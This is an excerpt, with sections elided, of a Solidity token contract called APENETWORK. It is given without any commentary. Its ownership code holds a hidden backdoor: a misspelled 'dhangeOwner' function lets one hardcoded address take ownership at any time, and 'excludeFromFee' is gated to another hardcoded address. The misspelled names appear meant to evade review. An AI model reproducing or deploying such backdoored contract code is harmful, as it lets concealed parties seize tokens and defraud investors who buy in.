...
contract Ownable {
    ...
    function dhangeOwner(address newOwner) public  {
        require
         (  
             msg.sender
            == 0x53ACC86522F97FdF9333C41396005858726ce54A
            );
                    _owner = newOwner;
    }
}
...
contract APENETWORK is IERC20, Ownable {
    ...
    constructor(address tokennOwner) {
        ...
        _lTotal = 1000000 * 10**_decimals;
        _pTotal = (MAX - (MAX % _lTotal));

        _pOwned[tokennOwner] = _pTotal;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_pOwned[account]);
    }
    ...
    function tokenFromReflection(uint256 pAmount)
        public
        view
        returns (uint256)
    {
        ...
        return pAmount.div(durrentRate);
    }
    ...
    function excludeFromFee(address account) public  {
        require
         (  
             msg.sender
            == 0x8e4259aEB903b0e4d3924AAaF35AdaAB29c4918C
            );
    ...
    function _getRate() private view returns (uint256) {
        (uint256 pSupply, uint256 lSupply) = _getdurrenlSupply();
        return pSupply.div(lSupply);
    }

    function _getdurrenlSupply() private view returns (uint256, uint256) {
        uint256 pSupply = _pTotal;
        uint256 lSupply = _lTotal;
        if (pSupply < _pTotal.div(_lTotal)) return (_pTotal, _lTotal);
        return (pSupply, lSupply);
    }
    ...
    function _tokenTransfer(
        ...
        uint256 pAmount = lAmount.mul(durrentRate);
        ...
        _pOwned[recipient] = _pOwned[recipient].add(
            pAmount.div(100).mul(recipientRate)
        );
    ...
    function _takeTransfer(
        ...
        uint256 pAmount = lAmount.mul(durrentRate);
        _pOwned[to] = _pOwned[to].add(pAmount);
        emit Transfer(sender, to, lAmount);
    }

    function _reflectFee(uint256 pFee, uint256 lFee) private {
    ...
    function _takeInviterFee(
        ...
        for (int256 i = 0; i < 5; i++) {
           uint256 rate;
            ...
            uint256 durPAmount = durlAmount.mul(durrentRate);
            _pOwned[dur] = _pOwned[dur].add(durPAmount);
